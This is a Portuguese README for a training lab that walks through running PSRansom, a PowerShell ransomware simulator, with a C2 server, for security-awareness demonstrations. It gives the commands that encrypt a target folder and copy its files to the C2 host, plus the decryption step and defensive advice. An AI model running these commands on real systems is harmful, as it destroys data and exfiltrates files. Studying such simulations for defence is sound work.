<div align="center">
  <img src="https://github.com/EfySecurity/Coding-Tool/blob/main/icons8-base-64.gif" alt="Project Logo">
</div>

## PSRansom - Simulação de Ransomware com C2

PSRansom ​​é um script escrito em PowerShell que permite simular o funcionamento de um Ransomware. É um script que você pode utilizar por exemplo em uma apresentação de conscientização sobre os riscos e o impacto que um ransomware pode causar.

🔴 O uso indevido desta técnica é de sua total responsabilidade e está sujeito as penalizações prevista na [Lei 12.737](https://www.planalto.gov.br/ccivil_03/_ato2011-2014/2012/lei/l12737.htm).

## Como Usar

01 - Realize o clone do projeto PSRansom

```bash
git clone https://github.com/JoelGMSec/PSRansom
```

02 - Entre no diretorio dos arquivos

```bash
cd PSRansom
```

03 - Use o comando para vizualizar todos arquivos contido no diretorio

```bash
ls -l
```

<div align="center">
  <img src="https://www.100security.com.br/images/psransom-01.png" alt="psransom-01.png">
</div>

04 - Inicie o C2 Server através do comando a seguir:

```bash
pwsh C2Server.ps1 + 80
```

<div align="center">
  <img src="https://www.100security.com.br/images/psransom-02.png" alt="psransom-02.png">
</div>

05 - No host Windows criei a pasta 100SECURITY com alguns arquivos como exemplo.

<div align="center">
  <img src="https://www.100security.com.br/images/psransom-03.png" alt="psransom-03.png">
</div>

06 - Realize o download do PSRansom no Windows e execute o comando a seguir:

```bash
.\PSRansom.ps1 -e C:\100SECURITY -s 192.168.0.76 -p 80 -x
```

<div align="center">
  <img src="https://www.100security.com.br/images/psransom-04.png" alt="psransom-04.png">
</div>

- C:\100SECURITY : Pasta Alvo
- 192.168.0.76 : Servidor C2
- 80 : Porta de conexão com o servidor C2
- -x : Realiza a cópia dos arquivos para o servidor C2

07 - No servidor C2 o atacante recebe a lista de arquivos que foram criptografados e a Chave de Recuperação.

```bash
Chave de Recuperação : WNLmTxjnDpzZGaEF4AsUYgi5
```

<div align="center">
  <img src="https://www.100security.com.br/images/psransom-05.png" alt="psransom-05.png">
</div>

Arquivos `criptografados` com a extensão `.psr`

<div align="center">
  <img src="https://www.100security.com.br/images/psransom-06.png" alt="psransom-06.png">
</div>

08 - Dentro da pasta C2Files o atacante recebe uma cópia de todos os arquivos antes da criptografia.

```bash
cd CS2Files
```

```bash
ls -l
```

<div align="center">
  <img src="https://www.100security.com.br/images/psransom-07.png" alt="psransom-07.png">
</div>

07 - Observe que foi criado o arquivo readme.txt contendo a Chave de Recuperação dos arquivos.

```bash
Recovery Key : WNLmTxjnDpzZGaEF4AsUYgi5
```

<div align="center">
  <img src="https://www.100security.com.br/images/psransom-08.png" alt="psransom-08.png">
</div>

08 - Para recuperar os arquivos basta digitar o comando a seguir :

```bash
.\PSRansom.ps1 -d C:\100SECURITY -K WNLmTxjnDpzZGaEF4AsUYgi5
```

<div align="center">
  <img src="https://www.100security.com.br/images/psransom-09.png" alt="psransom-09.png">
</div>

Arquivos `recuperados` com sucesso!

<div align="center">
  <img src="https://www.100security.com.br/images/psransom-10.png" alt="psransom-10.png">
</div>

🔴   Exibindo uma mensagem da Tela do Usuário
Para exibir a mensagem basta utilizar o parâmetro `-demo`:

```bash
.\PSRansom.ps1 -e C:\100SECURITY -s 192.168.0.76 -p 80 -x -demo
```

<div align="center">
  <img src="https://www.100security.com.br/images/psransom-11.png" alt="psransom-11.png">
</div>

💀 Mensagem!

<div align="center">
  <img src="https://www.100security.com.br/images/psransom-12.png" alt="psransom-12.png">
</div>

Se o usuário clicar em `Pay Now!` é exibido um pop-up na tela.

<div align="center">
  <img src="https://www.100security.com.br/images/psransom-13.png" alt="psransom-13.png">
</div>

## 🔓 Observações
O impacto e o prejuízo financeiro que este tipo de ataque por causar nas empresa é muito grande, segue algumas recomendações :

Conscientize de forma constante os colaboradores da sua empresa, sobre os riscos de segurança
Realize exercícios e simulações de Phishing, Ransomware, Engenharia Social, etc.
Invista em soluções de segurança como EDRs, AVs, Firewall, WAF, etc.
Se possível monte um time interno de segurança em sua empresa para realizar simulações de ataques reais.
Contrate uma consultoria especializada para avaliar seu ambiente de forma independente e periódica.
Leve a segurança dos dados da sua empresa e de seus clientes a sério!


# Simulação de Ransomware com C2 - Projeto de Estudo

Este projeto é uma simulação de ransomware com um servidor de comando e controle (C2) e é destinado apenas para fins educacionais e de aprendizado. Ele não deve ser usado de forma maliciosa ou prejudicial.

## Fonte Original

Este projeto foi inspirado por um tutorial e código fonte fornecido por [JoelGMSec](https://github.com/JoelGMSec). Certifique-se de verificar o tutorial original para obter mais informações detalhadas.

## Fonte da Simulação

As imagens do projeto mostradas acima foram tiradas do tutorial fornecido por [100SECURITY](https://www.100security.com.br/psransom).

---
**OBSERVAÇÃO:**
Quero deixar meus agradeçimentos ao [JoelGMSec](https://github.com/JoelGMSec) pela criação do projeto e tambem a equipe [100SECURITY](https://www.100security.com.br/psransom) pela demostração na pratica!!!

## Sobre o Projeto

O objetivo deste projeto é permitir que os estudantes de segurança cibernética compreendam como um ransomware pode funcionar, bem como aprender a se defender contra esse tipo de ameaça. É importante lembrar que a criação e disseminação de malware são atividades ilegais e prejudiciais.

## Pré-requisitos

Certifique-se de ter o ambiente adequado configurado para executar este projeto de forma segura. Você deve estar ciente de que este projeto simula um ransomware, e executá-lo em um ambiente de produção resultará em perda de dados.

## Contribuição e Responsabilidade

Este projeto é apenas para fins educacionais e não deve ser usado para atividades maliciosas. Os contribuidores deste projeto não se responsabilizam pelo uso inadequado ou ilegal do código fornecido.

## Licença

Este projeto está sob a [Licença MIT](LICENSE).
